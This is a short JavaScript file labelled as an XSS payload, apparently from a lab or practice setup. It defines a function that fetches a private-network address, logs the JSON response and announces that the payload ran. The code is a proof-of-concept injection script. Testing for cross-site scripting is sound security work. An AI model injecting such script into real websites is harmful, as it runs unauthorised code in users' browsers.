function xssPayload() {
  fetch('http://192.168.190.130/')
  .then((response) => response.json())
  .then((data) => console.log(data));

}

console.log('XSS payload executed');
xssPayload();
